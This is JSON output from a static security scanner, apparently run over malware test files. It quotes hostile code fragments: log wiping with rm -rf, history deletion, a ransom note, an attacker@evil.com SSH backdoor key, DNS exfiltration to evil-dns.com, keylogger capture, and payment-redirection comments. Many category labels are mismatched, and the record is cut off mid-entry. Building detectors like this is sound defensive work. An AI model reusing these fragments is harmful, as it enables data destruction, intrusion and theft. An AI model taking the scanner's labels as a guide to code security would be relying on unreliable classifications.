{
  "duration_ms": 530,
  "files_scanned": 5,
  "issues": [
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.571718",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "dc562f4f-6242-40ec-9671-4c70f200fa4c",
      "last_modified": "",
      "line_number": 234,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.571718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/home/user/.bash_history')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.572719",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "cdb9f30b-6431-42fb-a283-19325a1fa49e",
      "last_modified": "",
      "line_number": 237,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.572719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove(file_path)",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.573719",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "7e80a14e-6fd7-4b11-8a20-5debaa38e053",
      "last_modified": "",
      "line_number": 357,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.573719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
      "column": 48,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.581721",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "50e69de4-2be0-4c98-bfb8-a7ec76d47e32",
      "last_modified": "",
      "line_number": 373,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.581721"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.584721",
      "data_classification": "UNKNOWN",
      "debt_category": "SECURITY_ISSUE",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "ef062e37-9465-4ebe-80a6-b52470f8dc66",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-secrets-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Move secrets to environment variables or secure vault services.",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "VULNERABILITY",
      "update_date": "2025-08-11T20:23:02.584721"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.591719",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "2a96df8e-b294-415f-8078-aa7f24862d5a",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.591719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
      "column": 55,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.592718",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "30b6a67a-1535-41e7-aa70-d75c09502344",
      "last_modified": "",
      "line_number": 102,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.592718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
      "column": 16,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.598719",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "bf636a73-83a8-4212-9e46-64986060f204",
      "last_modified": "",
      "line_number": 459,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.598719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "password_data = ''.join(captured_keys[-50:])",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.600719",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "ddfac418-99ac-4dc6-beda-6851b3e991ce",
      "last_modified": "",
      "line_number": 462,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.600719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "app.run(host='0.0.0.0', port=80)",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.604719",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "887d3d52-e2df-4e76-b3c0-cfe0d5c79996",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.604719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
      "column": 10,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.605718",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "2953c75d-5639-41c9-a769-a7e8490af000",
      "last_modified": "",
      "line_number": 251,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.605718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.608719",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "c192f983-28c8-4a87-9d1b-b79332da4326",
      "last_modified": "",
      "line_number": 34,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.608719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.610720",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "30b684b9-4c9f-47a7-97e4-4afe84ac0213",
      "last_modified": "",
      "line_number": 97,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.610720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "data = f\"block_data_{nonce}\".encode()",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.610720",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "2322a36a-a91d-4a29-ae9e-c67668719666",
      "last_modified": "",
      "line_number": 262,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.610720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
      "column": 36,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.611720",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "a630c3f2-e8fd-4cb7-9772-6c5c87c128cf",
      "last_modified": "",
      "line_number": 343,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.611720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"{ip}: {open_ports}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.615719",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "860dee14-9ce5-48ae-a988-c43c43ac4d77",
      "last_modified": "",
      "line_number": 513,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.615719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "ip = f\"{network}.{i}\"",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.618720",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "3544fe96-714d-4cb6-8528-671224843af1",
      "last_modified": "",
      "line_number": 519,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.618720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "full_domain = f\"{sub}.{domain}\"",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.619723",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "e30a2fad-6bbe-46f7-b35b-d07699f5302b",
      "last_modified": "",
      "line_number": 558,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.619723"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.619723",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "19b28e2a-0f74-45d6-acfa-4401c744e277",
      "last_modified": "",
      "line_number": 560,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.619723"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"SNMP access with community: {community}\")",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.619723",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "1c31b0f6-e767-43ec-9917-bbc09dc1f567",
      "last_modified": "",
      "line_number": 586,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T20:23:02.619723"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.736720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "995c44dd-adda-4958-86ac-0b7888bacf9b",
      "last_modified": "",
      "line_number": 11,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.736720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(amount, developer_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.737721",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "50176d24-5e01-4325-8108-1cbc90837d20",
      "last_modified": "",
      "line_number": 76,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.737721"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payments to admin account during off-hours",
      "column": 15,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.738720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "0aff1260-e451-40b7-9a12-a3b7da9d5d6d",
      "last_modified": "",
      "line_number": 93,
      "message": "Detects potential financial fraud and unauthorized money redirection",
